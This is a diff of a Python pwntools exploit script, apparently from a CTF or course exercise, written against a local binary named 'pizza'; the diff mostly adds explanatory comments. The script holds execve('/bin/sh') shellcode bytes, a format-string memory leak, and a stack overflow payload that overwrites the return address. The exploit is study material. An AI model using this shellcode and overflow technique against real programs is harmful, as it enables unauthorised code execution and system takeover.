@@ -1,25 +1,36 @@
-
 #!/usr/bin/env python3
 
+# Contron flow integrity violation 
+# Author: Long Tran
+
+# needs pwn tools
 from pwn import *
 
 #context.log_level = 'error'
 
 # Executable and Linkable Format
 elf = ELF("./pizza")
-
+# specify the context
 context(arch='amd64', os='linux', endian='little', word_size=64)
 
-
+# my shellcode program
 shellcode = [0x48, 0x31, 0xc0, 0x50, 0x48, 0x89, 0xe6, 0x48, 0x89, 0xe2, 0x48, 0xbb, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x88, 0xd8, 0x53, 0x48, 0x89, 0xe7, 0x48, 0xff, 0xc7, 0x0f, 0x05]
+# do some printing about the shellcode
 print("len of shellcode is", len(shellcode), "bytes")
 
 
 # memory leak
+# the input to leak the memory
 input1 = b"%p " * (10)
+
+# run the process
 victim = process("./pizza")
+
+# get the first output line
 print(str(victim.recvline(), "latin-1"))
+# send the input1 to leak the memory
 victim.sendline(input1)
+# retrieve the leaked memory
 mem_leak = str(victim.recvline(), "latin-1")
 mem_leak = mem_leak.split()
 
@@ -28,9 +39,10 @@ victim.sendline(b"10")
 for i in range(7):
     print(str(victim.recvline(), "latin-1"))
 
-
-# the place where it crashed was 148
-# set the payload to be the codes to where the base pointer ends (136) + the return address (8 more bytes) + plus the shell code
+# the place where it crashed was 136
+# the old base stack pointer is 128-135 (inclusive). 
+# the return address was 136-144 (inclusive)
+# set the payload size to be the codes to where the base pointer ends + the return address + plus the shell code
 payload_size = 145 + len(shellcode)
 # set it to A
 payload = "A" * payload_size
